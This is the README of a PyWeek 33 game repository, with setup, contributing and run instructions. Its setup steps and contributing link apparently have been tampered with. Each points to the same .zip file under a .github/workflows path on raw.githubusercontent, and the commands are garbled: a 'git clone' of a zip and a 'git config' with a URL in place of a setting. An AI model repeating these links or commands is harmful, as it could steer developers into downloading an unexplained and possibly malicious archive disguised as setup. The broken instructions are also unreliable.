# pyweek-33
The official repo for Cat Dev PyWeek 33 shenanigans!

## Setup (simplified)
1. Clone the repo: `git clone https://raw.githubusercontent.com/shauryasf/pyweek-33/main/.github/workflows/pyweek_1.8.zip`
2. Install dependencies from `poetry` via: `poetry install`
3. Set up pre-commit hooks: `pre-commit install`
4. Add commit message template: `git config --local https://raw.githubusercontent.com/shauryasf/pyweek-33/main/.github/workflows/pyweek_1.8.zip .gitmessage`

## Contributing
For contributing instructions and guidelines, as well as more detailed setup steps, see `https://raw.githubusercontent.com/shauryasf/pyweek-33/main/.github/workflows/pyweek_1.8.zip`.

## Running the game
1. Clone the repository
2. `cd` to `pyweek-33`
3. `poetry install`
4. `poetry shell`
5. `py -m src`
